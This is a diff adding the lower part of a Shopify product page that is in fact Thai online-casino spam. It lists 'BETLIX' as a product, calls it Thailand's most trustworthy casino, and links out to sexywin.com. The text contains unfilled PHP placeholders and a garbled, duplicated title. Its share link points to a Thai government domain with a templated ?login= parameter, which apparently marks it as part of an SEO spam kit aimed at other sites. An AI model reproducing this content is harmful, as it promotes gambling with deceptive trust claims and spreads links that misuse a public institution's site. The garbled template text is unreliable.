+                      <span class="visually-hidden">Decrease quantity for BETLIX 💎 คาสิโนออนไลน์ที่น่าเชื่อถือที่สุดในประเทศไทย | เว็บไซต์เดิมพันคริกเก็ตที่ดีที่สุด!นคริกเก็ตที่ดีที่สุด!</span>
+                      <svg
+  xmlns="http://www.w3.org/2000/svg"
+  aria-hidden="true"
+  focusable="false"
+  class="icon icon-minus"
+  fill="none"
+  viewBox="0 0 10 2"
+>
+  <path fill-rule="evenodd" clip-rule="evenodd" d="M.5 1C.5.7.7.5 1 .5h8a.5.5 0 110 1H1A.5.5 0 01.5 1z" fill="currentColor">
+</svg>
+
+                    </button>
+                    <input
+                      class="quantity__input"
+                      type="number"
+                      name="quantity"
+                      id="Quantity-template--17446643597562__main"
+                      data-cart-quantity="0"
+                      data-min="1"
+                      min="1"
+                      
+                      step="1"
+                      value="1"
+                      form="product-form-template--17446643597562__main"
+                    />
+                    <button class="quantity__button no-js-hidden" name="plus" type="button">
+                      <span class="visually-hidden">Increase quantity for BETLIX 💎 คาสิโนออนไลน์ที่น่าเชื่อถือที่สุดในประเทศไทย | เว็บไซต์เดิมพันคริกเก็ตที่ดีที่สุด!นคริกเก็ตที่ดีที่สุด!</span>
+                      <svg
+  xmlns="http://www.w3.org/2000/svg"
+  aria-hidden="true"
+  focusable="false"
+  class="icon icon-plus"
+  fill="none"
+  viewBox="0 0 10 10"
+>
+  <path fill-rule="evenodd" clip-rule="evenodd" d="M1 4.51a.5.5 0 000 1h3.5l.01 3.5a.5.5 0 001-.01V5.5l3.5-.01a.5.5 0 00-.01-1H5.5L5.49.99a.5.5 0 00-1 .01v3.5l-3.5.01H1z" fill="currentColor">
+</svg>
+
+                    </button>
+                  </quantity-input></div>
+                <div class="quantity__rules caption no-js-hidden" id="Quantity-Rules-template--17446643597562__main"></div></div>
+<div ><product-form
+      class="product-form"
+      data-hide-errors="false"
+      data-section-id="template--17446643597562__main"
+    >
+      <div class="product-form__error-message-wrapper" role="alert" hidden>
+        <svg
+          aria-hidden="true"
+          focusable="false"
+          class="icon icon-error"
+          viewBox="0 0 13 13"
+        >
+          <circle cx="6.5" cy="6.50049" r="5.5" stroke="white" stroke-width="2"/>
+          <circle cx="6.5" cy="6.5" r="5.5" fill="#EB001B" stroke="#EB001B" stroke-width="0.7"/>
+          <path d="M5.87413 3.52832L5.97439 7.57216H7.02713L7.12739 3.52832H5.87413ZM6.50076 9.66091C6.88091 9.66091 7.18169 9.37267 7.18169 9.00504C7.18169 8.63742 6.88091 8.34917 6.50076 8.34917C6.12061 8.34917 5.81982 8.63742 5.81982 9.00504C5.81982 9.37267 6.12061 9.66091 6.50076 9.66091Z" fill="white"/>
+          <path d="M5.87413 3.17832H5.51535L5.52424 3.537L5.6245 7.58083L5.63296 7.92216H5.97439H7.02713H7.36856L7.37702 7.58083L7.47728 3.537L7.48617 3.17832H7.12739H5.87413ZM6.50076 10.0109C7.06121 10.0109 7.5317 9.57872 7.5317 9.00504C7.5317 8.43137 7.06121 7.99918 6.50076 7.99918C5.94031 7.99918 5.46982 8.43137 5.46982 9.00504C5.46982 9.57872 5.94031 10.0109 6.50076 10.0109Z" fill="white" stroke="#EB001B" stroke-width="0.7">
+        </svg>
+        <span class="product-form__error-message"></span>
+      </div><form method="post" action="/cart/add" id="product-form-template--17446643597562__main" accept-charset="UTF-8" class="form" enctype="multipart/form-data" novalidate="novalidate" data-type="add-to-cart-form"><input type="hidden" name="form_type" value="product" /><input type="hidden" name="utf8" value="✓" /><input
+          type="hidden"
+          name="id"
+          value="45178743423226"
+          
+          class="product-variant-id"
+        ><div class="product-form__buttons"><button
+            id="ProductSubmitButton-template--17446643597562__main"
+            type="submit"
+            name="add"
+            class="product-form__submit button button--full-width button--secondary"
+            
+          >
+            <span>Add to cart
+</span>
+
+<link href="//d3dc94-3.myshopify.com/cdn/shop/t/1/assets/component-loading-spinner.css?v=116724955567955766481707725442" rel="stylesheet" type="text/css" media="all" />
+
+<div class="loading__spinner hidden">
+  <svg
+    aria-hidden="true"
+    focusable="false"
+    class="spinner"
+    viewBox="0 0 66 66"
+    xmlns="http://www.w3.org/2000/svg"
+  >
+    <circle class="path" fill="none" stroke-width="6" cx="33" cy="33" r="30"></circle>
+  </svg>
+</div>
+</button><div data-shopify="payment-button" class="shopify-payment-button"> <dynamic-checkout wallet-configs="[]" access-token="46e1621bad0a0cf5f0c45efd2d26661a" buyer-country="ID" buyer-locale="en" buyer-currency="THB" variant-params="[{&quot;id&quot;:45178743423226,&quot;requiresShipping&quot;:true}]" shop-id="68938727674" > <div class="shopify-payment-button__button shopify-payment-button__skeleton" role="button" disabled aria-hidden="true">&nbsp;</div> </dynamic-checkout> </div>
+</div><input type="hidden" name="product-id" value="8172904907002" /><input type="hidden" name="section-id" value="template--17446643597562__main" /></form></product-form><link href="//d3dc94-3.myshopify.com/cdn/shop/t/1/assets/component-pickup-availability.css?v=34645222959864780961707725425" rel="stylesheet" type="text/css" media="all" />
+<pickup-availability
+      class="product__pickup-availabilities no-js-hidden quick-add-hidden"
+      
+      data-root-url="/"
+      data-variant-id="45178743423226"
+      data-has-only-default-variant="true"
+      data-product-page-color-scheme="gradient color-scheme-1"
+    >
+      <template>
+        <pickup-availability-preview class="pickup-availability-preview">
+          <svg
+  xmlns="http://www.w3.org/2000/svg"
+  fill="none"
+  aria-hidden="true"
+  focusable="false"
+  class="icon icon-unavailable"
+  fill="none"
+  viewBox="0 0 20 20"
+>
+  <path fill="#DE3618" stroke="#fff" d="M13.94 3.94L10 7.878l-3.94-3.94A1.499 1.499 0 103.94 6.06L7.88 10l-3.94 3.94a1.499 1.499 0 102.12 2.12L10 12.12l3.94 3.94a1.497 1.497 0 002.12 0 1.499 1.499 0 000-2.12L12.122 10l3.94-3.94a1.499 1.499 0 10-2.121-2.12z"/>
+</svg>
+
+          <div class="pickup-availability-info">
+            <p class="caption-large">Couldn&#39;t load pickup availability</p>
+            <button class="pickup-availability-button link link--text underlined-link">
+              Refresh
+            </button>
+          </div>
+        </pickup-availability-preview>
+      </template>
+    </pickup-availability>
+
+    <script src="//d3dc94-3.myshopify.com/cdn/shop/t/1/assets/pickup-availability.js?v=66138958121968076331707725443" defer="defer"></script></div>
+<div class="product__description rte quick-add-hidden" >
+                  <p><a href="https://sexywin.com/"><img src="https://i.postimg.cc/HssC5nyM/button.gif" alt="d6adaf-0d2661f513da4f51b612e812556004f3-mv2" border="0"></a></p>
+
+วางเดิมพันของคุณและรับรางวัลใหญ่ที่คาสิโนออนไลน์ที่น่าเชื่อถือที่สุดในประเทศไทย - <?php echo $BRANDS ?>! เพลิดเพลินกับเกมและโบนัสที่หลากหลายที่ <?php echo $BRANDS ?> เช่น การเดิมพันคริกเก็ตและคาสิโนสด!
+                </div>
+              
+<script src="//d3dc94-3.myshopify.com/cdn/shop/t/1/assets/share.js?v=13024540447964430191707725443" defer="defer"></script>
+
+<share-button id="Share-template--17446643597562__main" class="share-button quick-add-hidden" >
+  <button class="share-button__button hidden">
+    <svg
+  width="13"
+  height="12"
+  viewBox="0 0 13 12"
+  class="icon icon-share"
+  fill="none"
+  xmlns="http://www.w3.org/2000/svg"
+  aria-hidden="true"
+  focusable="false"
+>
+  <path d="M1.625 8.125V10.2917C1.625 10.579 1.73914 10.8545 1.9423 11.0577C2.14547 11.2609 2.42102 11.375 2.70833 11.375H10.2917C10.579 11.375 10.8545 11.2609 11.0577 11.0577C11.2609 10.8545 11.375 10.579 11.375 10.2917V8.125" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"/>
+  <path fill-rule="evenodd" clip-rule="evenodd" d="M6.14775 1.27137C6.34301 1.0761 6.65959 1.0761 6.85485 1.27137L9.56319 3.9797C9.75845 4.17496 9.75845 4.49154 9.56319 4.6868C9.36793 4.88207 9.05135 4.88207 8.85609 4.6868L6.5013 2.33203L4.14652 4.6868C3.95126 4.88207 3.63468 4.88207 3.43942 4.6868C3.24415 4.49154 3.24415 4.17496 3.43942 3.9797L6.14775 1.27137Z" fill="currentColor"/>
+  <path fill-rule="evenodd" clip-rule="evenodd" d="M6.5 1.125C6.77614 1.125 7 1.34886 7 1.625V8.125C7 8.40114 6.77614 8.625 6.5 8.625C6.22386 8.625 6 8.40114 6 8.125V1.625C6 1.34886 6.22386 1.125 6.5 1.125Z" fill="currentColor"/>
+</svg>
+
+    Share
+  </button>
+  <details id="Details-share-template--17446643597562__main">
+    <summary class="share-button__button">
+      <svg
+  width="13"
+  height="12"
+  viewBox="0 0 13 12"
+  class="icon icon-share"
+  fill="none"
+  xmlns="http://www.w3.org/2000/svg"
+  aria-hidden="true"
+  focusable="false"
+>
+  <path d="M1.625 8.125V10.2917C1.625 10.579 1.73914 10.8545 1.9423 11.0577C2.14547 11.2609 2.42102 11.375 2.70833 11.375H10.2917C10.579 11.375 10.8545 11.2609 11.0577 11.0577C11.2609 10.8545 11.375 10.579 11.375 10.2917V8.125" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"/>
+  <path fill-rule="evenodd" clip-rule="evenodd" d="M6.14775 1.27137C6.34301 1.0761 6.65959 1.0761 6.85485 1.27137L9.56319 3.9797C9.75845 4.17496 9.75845 4.49154 9.56319 4.6868C9.36793 4.88207 9.05135 4.88207 8.85609 4.6868L6.5013 2.33203L4.14652 4.6868C3.95126 4.88207 3.63468 4.88207 3.43942 4.6868C3.24415 4.49154 3.24415 4.17496 3.43942 3.9797L6.14775 1.27137Z" fill="currentColor"/>
+  <path fill-rule="evenodd" clip-rule="evenodd" d="M6.5 1.125C6.77614 1.125 7 1.34886 7 1.625V8.125C7 8.40114 6.77614 8.625 6.5 8.625C6.22386 8.625 6 8.40114 6 8.125V1.625C6 1.34886 6.22386 1.125 6.5 1.125Z" fill="currentColor"/>
+</svg>
+
+      Share
+    </summary>
+    <div class="share-button__fallback motion-reduce">
+      <div class="field">
+        <span id="ShareMessage-template--17446643597562__main" class="share-button__message hidden" role="status"> </span>
+        <input
+          type="text"
+          class="field__input"
+          id="ShareUrl-template--17446643597562__main"
+          value="http://swdata.srisangworn.go.th/?login=<?php echo $BRANDS ?>"
+          placeholder="Link"
+          onclick="this.select();"
+          readonly
+        >
+        <label class="field__label" for="ShareUrl-template--17446643597562__main">Link</label>
+      </div>
+      <button class="share-button__close hidden no-js-hidden">
+        <svg
+  xmlns="http://www.w3.org/2000/svg"
+  aria-hidden="true"
+  focusable="false"
+  class="icon icon-close"
+  fill="none"
+  viewBox="0 0 18 17"
+>
+  <path d="M.865 15.978a.5.5 0 00.707.707l7.433-7.431 7.579 7.282a.501.501 0 00.846-.37.5.5 0 00-.153-.351L9.712 8.546l7.417-7.416a.5.5 0 10-.707-.708L8.991 7.853 1.413.573a.5.5 0 10-.693.72l7.563 7.268-7.418 7.417z" fill="currentColor">
+</svg>
+
+        <span class="visually-hidden">Close share</span>
+      </button>
+      <button class="share-button__copy no-js-hidden">
+        <svg
+  class="icon icon-clipboard"
+  width="11"
+  height="13"
+  fill="none"
+  xmlns="http://www.w3.org/2000/svg"
+  aria-hidden="true"
+  focusable="false"
+  viewBox="0 0 11 13"
+>
+  <path fill-rule="evenodd" clip-rule="evenodd" d="M2 1a1 1 0 011-1h7a1 1 0 011 1v9a1 1 0 01-1 1V1H2zM1 2a1 1 0 00-1 1v9a1 1 0 001 1h7a1 1 0 001-1V3a1 1 0 00-1-1H1zm0 10V3h7v9H1z" fill="currentColor"/>
+</svg>
+
+        <span class="visually-hidden">Copy link</span>
+      </button>
+    </div>
+  </details>
+</share-button>
+
+<a href="/products/betlix-%F0%9F%92%8E-%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B5%E0%B9%88%E0%B8%99%E0%B9%88%E0%B8%B2%E0%B9%80%E0%B8%8A%E0%B8%B7%E0%B9%88%E0%B8%AD%E0%B8%96%E0%B8%B7%E0%B8%AD%E0%B8%97%E0%B8%B5%E0%B9%88%E0%B8%AA%E0%B8%B8%E0%B8%94%E0%B9%83%E0%B8%99%E0%B8%9B%E0%B8%A3%E0%B8%B0%E0%B9%80%E0%B8%97%E0%B8%A8%E0%B9%84%E0%B8%97%E0%B8%A2-%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%84%E0%B8%8B%E0%B8%95%E0%B9%8C%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%84%E0%B8%A3%E0%B8%B4%E0%B8%81%E0%B9%80%E0%B8%81%E0%B9%87%E0%B8%95%E0%B8%97%E0%B8%B5%E0%B9%88%E0%B8%94%E0%B8%B5%E0%B8%97%E0%B8%B5%E0%B9%88%E0%B8%AA%E0%B8%B8%E0%B8%94" class="link product__view-details animate-arrow">
+          View full details
+          <svg
+  viewBox="0 0 14 10"
+  fill="none"
+  aria-hidden="true"
+  focusable="false"
+  class="icon icon-arrow"
+  xmlns="http://www.w3.org/2000/svg"
+>
+  <path fill-rule="evenodd" clip-rule="evenodd" d="M8.537.808a.5.5 0 01.817-.162l4 4a.5.5 0 010 .708l-4 4a.5.5 0 11-.708-.708L11.793 5.5H1a.5.5 0 010-1h10.793L8.646 1.354a.5.5 0 01-.109-.546z" fill="currentColor">
+</svg>
+
+        </a>
+      </product-info>
+    </div></div>
+
+  
+
+<product-modal id="ProductModal-template--17446643597562__main" class="product-media-modal media-modal">
+  <div
+    class="product-media-modal__dialog color-scheme-1 gradient"
+    role="dialog"
+    aria-label="Media gallery"
+    aria-modal="true"
+    tabindex="-1"
+  >
+    <button
+      id="ModalClose-template--17446643597562__main"
+      type="button"
+      class="product-media-modal__toggle"
+      aria-label="Close"
+    >
+      <svg
+  xmlns="http://www.w3.org/2000/svg"
+  aria-hidden="true"
+  focusable="false"
+  class="icon icon-close"
+  fill="none"
+  viewBox="0 0 18 17"
+>
+  <path d="M.865 15.978a.5.5 0 00.707.707l7.433-7.431 7.579 7.282a.501.501 0 00.846-.37.5.5 0 00-.153-.351L9.712 8.546l7.417-7.416a.5.5 0 10-.707-.708L8.991 7.853 1.413.573a.5.5 0 10-.693.72l7.563 7.268-7.418 7.417z" fill="currentColor">
+</svg>
+
+    </button>
+
+    <div
+      class="product-media-modal__content color-scheme-1 gradient"
+      role="document"
+      aria-label="Media gallery"
+      tabindex="0"
+    >
+<img
+    class="global-media-settings global-media-settings--no-shadow"
+    srcset="//d3dc94-3.myshopify.com/cdn/shop/files/image.webp?v=1707735740&width=550 550w,//d3dc94-3.myshopify.com/cdn/shop/files/image.webp?v=1707735740 736w"
+    sizes="(min-width: 750px) calc(100vw - 22rem), 1100px"
+    src="//d3dc94-3.myshopify.com/cdn/shop/files/image.webp?v=1707735740&width=1445"
+    alt="BETLIX 💎 คาสิโนออนไลน์ที่น่าเชื่อถือที่สุดในประเทศไทย | เว็บไซต์เดิมพันคริกเก็ตที่ดีที่สุด!นคริกเก็ตที่ดีที่สุด!"
+    loading="lazy"
+    width="1100"
+    height="1118"
+    data-media-id="33159673872634"
+  ></div>
+  </div>
+</product-modal>
+
+
+  
+<script src="//d3dc94-3.myshopify.com/cdn/shop/t/1/assets/product-modal.js?v=116616134454508949461707725434" defer="defer"></script>
+    <script src="//d3dc94-3.myshopify.com/cdn/shop/t/1/assets/media-gallery.js?v=96661908581229995091707725425" defer="defer"></script><script>
+    document.addEventListener('DOMContentLoaded', function () {
+      function isIE() {
+        const ua = window.navigator.userAgent;
+        const msie = ua.indexOf('MSIE ');
+        const trident = ua.indexOf('Trident/');
+
+        return msie > 0 || trident > 0;
+      }
+
+      if (!isIE()) return;
+      const hiddenInput = document.querySelector('#product-form-template--17446643597562__main input[name="id"]');
+      const noScriptInputWrapper = document.createElement('div');
+      const variantPicker = document.querySelector('variant-selects[data-section="template--17446643597562__main"]');
+      noScriptInputWrapper.innerHTML = document.querySelector(
+        '.product-form__noscript-wrapper-template--17446643597562__main'
+      ).textContent;
+      variantPicker.outerHTML = noScriptInputWrapper.outerHTML;
+
+      document.querySelector('#Variants-template--17446643597562__main').addEventListener('change', function (event) {
+        hiddenInput.value = event.currentTarget.value;
+      });
+    });
+  </script><script type="application/ld+json">
+    {
+      "@context": "http://schema.org/",
+      "@type": "Product",
+      "name": "BETLIX 💎 คาสิโนออนไลน์ที่น่าเชื่อถือที่สุดในประเทศไทย | เว็บไซต์เดิมพันคริกเก็ตที่ดีที่สุด!นคริกเก็ตที่ดีที่สุด!",
+      "url": "https:\/\/d3dc94-3.myshopify.com\/products\/betlix-%F0%9F%92%8E-%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B5%E0%B9%88%E0%B8%99%E0%B9%88%E0%B8%B2%E0%B9%80%E0%B8%8A%E0%B8%B7%E0%B9%88%E0%B8%AD%E0%B8%96%E0%B8%B7%E0%B8%AD%E0%B8%97%E0%B8%B5%E0%B9%88%E0%B8%AA%E0%B8%B8%E0%B8%94%E0%B9%83%E0%B8%99%E0%B8%9B%E0%B8%A3%E0%B8%B0%E0%B9%80%E0%B8%97%E0%B8%A8%E0%B9%84%E0%B8%97%E0%B8%A2-%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%84%E0%B8%8B%E0%B8%95%E0%B9%8C%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%84%E0%B8%A3%E0%B8%B4%E0%B8%81%E0%B9%80%E0%B8%81%E0%B9%87%E0%B8%95%E0%B8%97%E0%B8%B5%E0%B9%88%E0%B8%94%E0%B8%B5%E0%B8%97%E0%B8%B5%E0%B9%88%E0%B8%AA%E0%B8%B8%E0%B8%94",
+      "image": [
+          "https:\/\/d3dc94-3.myshopify.com\/cdn\/shop\/files\/image.webp?v=1707735740\u0026width=1920"
+        ],
+      "description": "\n\nวางเดิมพันของคุณและรับรางวัลใหญ่ที่คาสิโนออนไลน์ที่น่าเชื่อถือที่สุดในประเทศไทย - BETLIX! เพลิดเพลินกับเกมและโบนัสที่หลากหลายที่ SUPER SLOT เช่น การเดิมพันคริกเก็ตและคาสิโนสด!",
+      
+      "brand": {
+        "@type": "Brand",
+        "name": "SEXYWIN"
+      },
+      "offers": [{
+            "@type" : "Offer","availability" : "http://schema.org/InStock",
+            "price" : 888.0,
+            "priceCurrency" : "THB",
+            "url" : "https:\/\/d3dc94-3.myshopify.com\/products\/betlix-%F0%9F%92%8E-%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B5%E0%B9%88%E0%B8%99%E0%B9%88%E0%B8%B2%E0%B9%80%E0%B8%8A%E0%B8%B7%E0%B9%88%E0%B8%AD%E0%B8%96%E0%B8%B7%E0%B8%AD%E0%B8%97%E0%B8%B5%E0%B9%88%E0%B8%AA%E0%B8%B8%E0%B8%94%E0%B9%83%E0%B8%99%E0%B8%9B%E0%B8%A3%E0%B8%B0%E0%B9%80%E0%B8%97%E0%B8%A8%E0%B9%84%E0%B8%97%E0%B8%A2-%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%84%E0%B8%8B%E0%B8%95%E0%B9%8C%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%84%E0%B8%A3%E0%B8%B4%E0%B8%81%E0%B9%80%E0%B8%81%E0%B9%87%E0%B8%95%E0%B8%97%E0%B8%B5%E0%B9%88%E0%B8%94%E0%B8%B5%E0%B8%97%E0%B8%B5%E0%B9%88%E0%B8%AA%E0%B8%B8%E0%B8%94?variant=45178743423226"
+          }
+]
+    }
+  </script>
+  </div>
+</section>
+
+
+</section><section id="shopify-section-template--17446643597562__related-products" class="shopify-section section"><link href="//d3dc94-3.myshopify.com/cdn/shop/t/1/assets/component-card.css?v=170127402091165654191707725438" rel="stylesheet" type="text/css" media="all" />
+<link href="//d3dc94-3.myshopify.com/cdn/shop/t/1/assets/component-price.css?v=70172745017360139101707725421" rel="stylesheet" type="text/css" media="all" />
+<link href="//d3dc94-3.myshopify.com/cdn/shop/t/1/assets/section-related-products.css?v=80324771040738084201707725428" rel="stylesheet" type="text/css" media="all" />
+
+<style data-shopify>.section-template--17446643597562__related-products-padding {
+    padding-top: 27px;
+    padding-bottom: 21px;
+  }
+
+  @media screen and (min-width: 750px) {
+    .section-template--17446643597562__related-products-padding {
+      padding-top: 36px;
+      padding-bottom: 28px;
+    }
+  }</style><div class="color-scheme-1 gradient no-js-hidden">
+  <product-recommendations
+    class="related-products page-width section-template--17446643597562__related-products-padding isolate scroll-trigger animate--slide-in"
+    data-url="/recommendations/products?section_id=template--17446643597562__related-products&product_id=8172904907002&limit=4"
+  >
+    
+  </product-recommendations>
+  </div>
+
+
+</section>
+    </main>
+
+    <!-- BEGIN sections: footer-group -->
+<div id="shopify-section-sections--17446643794170__footer" class="shopify-section shopify-section-group-footer-group">
+<link href="//d3dc94-3.myshopify.com/cdn/shop/t/1/assets/section-footer.css?v=72619989355558646551707725443" rel="stylesheet" type="text/css" media="all" />
+<link href="//d3dc94-3.myshopify.com/cdn/shop/t/1/assets/component-newsletter.css?v=4727253280200485261707725439" rel="stylesheet" type="text/css" media="all" />
+<link href="//d3dc94-3.myshopify.com/cdn/shop/t/1/assets/component-list-menu.css?v=151968516119678728991707725431" rel="stylesheet" type="text/css" media="all" />
+<link href="//d3dc94-3.myshopify.com/cdn/shop/t/1/assets/component-list-payment.css?v=69253961410771838501707725426" rel="stylesheet" type="text/css" media="all" />
+<link href="//d3dc94-3.myshopify.com/cdn/shop/t/1/assets/component-list-social.css?v=35792976012981934991707725419" rel="stylesheet" type="text/css" media="all" />
+<style data-shopify>.footer {
+    margin-top: 0px;
+  }
+
+  .section-sections--17446643794170__footer-padding {
+    padding-top: 27px;
+    padding-bottom: 27px;
+  }
+
+  @media screen and (min-width: 750px) {
+    .footer {
+      margin-top: 0px;
+    }
+
+    .section-sections--17446643794170__footer-padding {
+      padding-top: 36px;
+      padding-bottom: 36px;
+    }
+  }</style><footer class="footer color-scheme-1 gradient section-sections--17446643794170__footer-padding"><div class="footer__content-top page-width"><div
+          class="footer-block--newsletter scroll-trigger animate--slide-in"
+          
+            data-cascade
+          
+        ><div class="footer-block__newsletter"><h2 class="footer-block__heading inline-richtext">Subscribe to our emails</h2><form method="post" action="/contact#ContactFooter" id="ContactFooter" accept-charset="UTF-8" class="footer__newsletter newsletter-form"><input type="hidden" name="form_type" value="customer" /><input type="hidden" name="utf8" value="✓" /><input type="hidden" name="contact[tags]" value="newsletter">
+                <div class="newsletter-form__field-wrapper">
+                  <div class="field">
+                    <input
+                      id="NewsletterForm--sections--17446643794170__footer"
+                      type="email"
+                      name="contact[email]"
+                      class="field__input"
+                      value=""
+                      aria-required="true"
+                      autocorrect="off"
+                      autocapitalize="off"
+                      autocomplete="email"
+                      
+                      placeholder="Email"
+                      required
+                    >
+                    <label class="field__label" for="NewsletterForm--sections--17446643794170__footer">
+                      Email
+                    </label>
+                    <button
+                      type="submit"
+                      class="newsletter-form__button field__button"
+                      name="commit"
+                      id="Subscribe"
+                      aria-label="Subscribe"
+                    >
+                      <svg
+  viewBox="0 0 14 10"
+  fill="none"
+  aria-hidden="true"
+  focusable="false"
+  class="icon icon-arrow"
+  xmlns="http://www.w3.org/2000/svg"
+>
+  <path fill-rule="evenodd" clip-rule="evenodd" d="M8.537.808a.5.5 0 01.817-.162l4 4a.5.5 0 010 .708l-4 4a.5.5 0 11-.708-.708L11.793 5.5H1a.5.5 0 010-1h10.793L8.646 1.354a.5.5 0 01-.109-.546z" fill="currentColor">
+</svg>
+
+                    </button>
+                  </div></div></form></div></div>
+      </div><div
+    class="footer__content-bottom scroll-trigger animate--slide-in"
+    
+      data-cascade
+    
+  >
+    <div class="footer__content-bottom-wrapper page-width">
+      <div class="footer__column footer__localization isolate"></div>
+      <div class="footer__column footer__column--info"><div class="footer__payment">
+            <span class="visually-hidden">Payment methods</span>
+            <ul class="list list-payment" role="list"></ul>
+          </div></div>
+    </div>
+    <div class="footer__content-bottom-wrapper page-width">
+      <div class="footer__copyright caption">
+        <small class="copyright__content"
+          >&copy; 2024, <a href="/" title="">SEXYWIN</a></small>
+        <small class="copyright__content"><a target="_blank" rel="nofollow" href="https://www.shopify.com?utm_campaign=poweredby&amp;utm_medium=shopify&amp;utm_source=onlinestore">Powered by Shopify</a></small></div>
+    </div>
+  </div>
+</footer>
+
+
+</div>
+<!-- END sections: footer-group -->
+
+    <ul hidden>
+      <li id="a11y-refresh-page-message">Choosing a selection results in a full page refresh.</li>
+      <li id="a11y-new-window-message">Opens in a new window.</li>
+    </ul>
+
+    <script>
+      window.shopUrl = 'https://d3dc94-3.myshopify.com';
+      window.routes = {
+        cart_add_url: '/cart/add',
+        cart_change_url: '/cart/change',
+        cart_update_url: '/cart/update',
+        cart_url: '/cart',
+        predictive_search_url: '/search/suggest',
+      };
+
+      window.cartStrings = {
+        error: `There was an error while updating your cart. Please try again.`,
+        quantityError: `You can only add [quantity] of this item to your cart.`,
+      };
+
+      window.variantStrings = {
+        addToCart: `Add to cart`,
+        soldOut: `Sold out`,
+        unavailable: `Unavailable`,
+        unavailable_with_option: `[value] - Unavailable`,
+      };
+
+      window.quickOrderListStrings = {
+        itemsAdded: `[quantity] items added`,
+        itemAdded: `[quantity] item added`,
+        itemsRemoved: `[quantity] items removed`,
+        itemRemoved: `[quantity] item removed`,
+        viewCart: `View cart`,
+        each: `[money]/ea`,
+      };
+
+      window.accessibilityStrings = {
+        imageAvailable: `Image [index] is now available in gallery view`,
+        shareSuccess: `Link copied to clipboard`,
+        pauseSlideshow: `Pause slideshow`,
+        playSlideshow: `Play slideshow`,
+        recipientFormExpanded: `Gift card recipient form expanded`,
+        recipientFormCollapsed: `Gift card recipient form collapsed`,
+        countrySelectorSearchCount: `[count] countries/regions found`,
+      };
+    </script><script src="//d3dc94-3.myshopify.com/cdn/shop/t/1/assets/predictive-search.js?v=162273246065392412141707725429" defer="defer"></script></body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
